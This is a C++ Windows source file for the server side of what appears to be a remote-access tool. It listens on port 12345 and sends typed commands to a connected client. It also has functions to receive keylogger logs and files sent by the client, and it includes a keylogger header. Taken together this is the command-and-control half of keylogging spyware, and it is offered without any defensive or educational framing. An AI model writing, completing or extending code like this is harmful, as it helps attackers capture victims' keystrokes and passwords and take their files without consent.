#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <string>
#include <fstream>
#include <cstdint>
#include "process_utils.h"
#include "keylogger.h"
#include <algorithm>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

void receiveResponse(SOCKET clientSock)
{
    char buffer[1024];
    int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0)
    {
        std::cerr << "Failed to receive response from client." << std::endl;
        return;
    }
    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received response: " << buffer << std::endl;
}

void receiveKeyloggerLog(SOCKET sock)
{
    uint32_t len = 0;

    int received = recv(sock, (char*)&len, sizeof(len), 0);
    if (received != sizeof(len))
    {
        std::cerr << "Failed to receive keylogger log length." << std::endl;
        return;
    }
    if (len == 0)
    {
        std::cout << "No keylogger log available." << std::endl;
        return;
    }

    char* buffer = new char[len + 1];
    int total = 0;

    while (total < len)
    {
        int bytes = recv(sock, buffer + total, len - total, 0);
        if (bytes <= 0)
        {
            std::cerr << "Failed to receive keylogger log content." << std::endl;
            delete[] buffer;
            return;
        }
        total += bytes;
    }

    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received keylogger log (" << len << " bytes):" << std::endl;
    std::cout << buffer << std::endl;
    delete[] buffer;
}

void receiveFile(SOCKET sock)
{
    uint32_t nameLen;
    if (recv(sock, reinterpret_cast<char*>(&nameLen), sizeof(nameLen), 0) != sizeof(nameLen))
    {
        std::cerr << "Failed to receive filename length." << std::endl;
        return;
    }
    char* nameBuf = new char[nameLen + 1];
    if (recv(sock, nameBuf, nameLen, 0) != nameLen)
    {
        std::cerr << "Failed to receive filename." << std::endl;
        delete[] nameBuf;
        return;
    }

    nameBuf[nameLen] = '\0'; // Null-terminate the filename
    std::string filename = "received_" + std::string(nameBuf);
    delete[] nameBuf;

    uint32_t fileSize;
    if (recv(sock, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0) != sizeof(fileSize))
    {
        std::cerr << "Failed to receive file size." << std::endl;
        return;
    }
    if (fileSize == 0)
    {
        std::cout << "No file content received." << std::endl;
        return;
    }

    std::ofstream outFile(filename, std::ios::binary);
    if (!outFile.is_open())
    {
        std::cerr << "Failed to open file for writing: " << filename << std::endl;
        return;
    }
    char buffer[4096];
    int received = 0;

    while (received < fileSize)
    {
        int chunk = recv(sock, buffer, std::min((int)sizeof(buffer), (int)(fileSize - received)), 0);
        if (chunk <= 0)
        {
            std::cerr << "Failed to receive file content." << std::endl;
            outFile.close();
            return;
        }
        outFile.write(buffer, chunk);
        received += chunk;
    }
    outFile.close();
    std::cout << "File received and saved as: " << filename << std::endl;
    std::cout << "File content received from client." << std::endl;
}

int main()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }
    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    listen(serverSock, 1);
    std::cout << "Server is listening on port 12345..." << std::endl;

    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    std::cout << "Client connected." << std::endl;

    while (true)
    {
        std::string cmd;
        std::cout << '\n';
        std::getline(std::cin, cmd);

        if (cmd == "exit")
        {
            std::cout << "Exiting server." << std::endl;
            break;
        }
        if (send(clientSock, cmd.c_str(), cmd.size(), 0) == SOCKET_ERROR)
        {
            std::cerr << "Failed to send command to client." << std::endl;
            break;
        }
        std::cout << "Command sent: " << cmd << std::endl;
        receiveResponse(clientSock);
    }

    closesocket(clientSock);
    closesocket(serverSock);
    WSACleanup();

    return 0;
}